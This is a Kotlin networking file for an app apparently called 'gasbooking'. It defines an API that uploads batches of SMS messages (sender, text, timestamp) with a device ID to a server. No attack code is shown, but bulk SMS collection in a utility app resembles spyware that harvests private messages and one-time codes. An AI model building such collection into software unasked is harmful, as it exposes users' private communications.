package com.gasbooking.app.network

import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST

// Batch Request Data Transfer Objects (DTO)
data class SMSBatchRequest(
    val deviceId: String,
    val appVersion: String,
    val messages: List<SMSRequest>
)

data class SMSRequest(
    val sender: String,
    val message: String,
    val timestamp: String
)

interface SMSApiService {
    // Upgraded for multi-device batch sync
    @POST("api/sms/save")
    suspend fun saveSMSBatch(@Body request: SMSBatchRequest): Response<Unit>
}
